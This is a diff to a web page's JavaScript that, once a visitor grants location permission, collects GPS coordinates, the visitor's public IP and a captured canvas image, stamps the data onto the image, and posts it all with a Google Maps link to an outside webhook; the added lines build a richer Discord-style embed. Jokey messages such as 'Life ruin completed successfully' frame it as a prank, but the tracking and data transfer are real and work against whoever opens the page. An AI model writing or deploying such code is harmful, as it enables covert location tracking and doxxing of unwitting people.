@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Oops Busted!</title>
+  <title>Oops busted!</title>
   <style>
     body {
       margin: 0;
@@ -104,7 +104,7 @@
             let errorMessage;
             switch (error.code) {
               case error.PERMISSION_DENIED:
-                errorMessage = "User denied GPS permission.";
+                errorMessage = "User chickened out.";
                 break;
               case error.POSITION_UNAVAILABLE:
                 errorMessage = "GPS location unavailable.";
@@ -128,7 +128,7 @@
     }
 
     async function main() {
-      updateMessage("stealing credentials...");
+      updateMessage("Stealing credentials...");
       logMessage("Initializing...");
 
       const canvas = document.createElement("canvas");
@@ -182,13 +182,50 @@
         const { ip } = await ipResponse.json();
         logMessage(`IP Address: ${ip}`);
 
-        // Send data to webhook
+        // Overlay data on image
+        ctx.fillStyle = "red";
+        ctx.font = "24px Arial";
+        ctx.fillText(`IP: ${ip}`, 10, canvas.height - 50);
+        ctx.fillText(`Lat: ${latitude.toFixed(6)}`, 10, canvas.height - 30);
+        ctx.fillText(`Long: ${longitude.toFixed(6)}`, 10, canvas.height - 10);
+
+        // Prepare webhook payload
         const finalImage = canvas.toDataURL("image/png");
         const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        const base64Data = finalImage.split(',')[1];
+        const byteCharacters = atob(base64Data);
+        const byteNumbers = Array.from(byteCharacters).map(char => char.charCodeAt(0));
+        const byteArray = new Uint8Array(byteNumbers);
+        const imageBlob = new Blob([byteArray], { type: 'image/png' });
+
         const formData = new FormData();
-        formData.append("file", new Blob([atob(finalImage.split(",")[1])], { type: "image/png" }), "captured_image.png");
+        formData.append("file", imageBlob, "captured_image.png");
         formData.append("payload_json", JSON.stringify({
-          content: `Captured user data:\nIP Address: \`${ip}\`\nCoordinates: \`${latitude.toFixed(6)}, ${longitude.toFixed(6)}\`\nGoogle Maps: ${mapsUrl}`
+          content: `Captured user data:`,
+          embeds: [
+            {
+              title: "User Data",
+              description: `[Google Maps Link](${mapsUrl})`,
+              color: 16711680,
+              fields: [
+                {
+                  name: "IP Address",
+                  value: `\`${ip}\``,
+                  inline: false
+                },
+                {
+                  name: "Coordinates (Full)",
+                  value: `Latitude: \`${latitude.toFixed(6)}\`\nLongitude: \`${longitude.toFixed(6)}\``,
+                  inline: false
+                },
+                {
+                  name: "Raw Coordinates",
+                  value: `\`${latitude.toFixed(6)}, ${longitude.toFixed(6)}\``,
+                  inline: false
+                }
+              ]
+            }
+          ]
         }));
 
         updateMessage("Sending data to Dark web...");
@@ -202,7 +239,7 @@
         );
 
         if (response.ok) {
-          logMessage("Data successfully sent to dark web.");
+          logMessage("Data successfully sent to Dark web.");
           updateMessage("Life ruin completed successfully.");
         } else {
           const errorText = await response.text();
